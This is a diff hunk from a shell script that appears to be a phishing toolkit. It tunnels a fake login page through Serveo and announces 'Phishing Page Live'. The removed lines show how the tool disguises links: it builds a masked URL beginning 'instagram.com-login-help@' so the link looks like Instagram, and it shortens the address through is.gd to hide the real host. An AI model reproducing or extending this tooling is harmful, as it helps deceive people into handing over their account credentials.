@@ -114,14 +114,6 @@ start_serveo() {
 
     if [ ! -z "$SERVEO_URL" ]; then
         echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL ${NC}"
-
-        # Masked URL
-        MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
-        echo -e "${GRN}[+] Masked URL: $MASKED_URL ${NC}"
-
-        # Shortened URL
-        SHORTENED_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$SERVEO_URL")
-        echo -e "${GRN}[+] Shortened URL: $SHORTENED_URL ${NC}"
     else
         echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}"
     fi
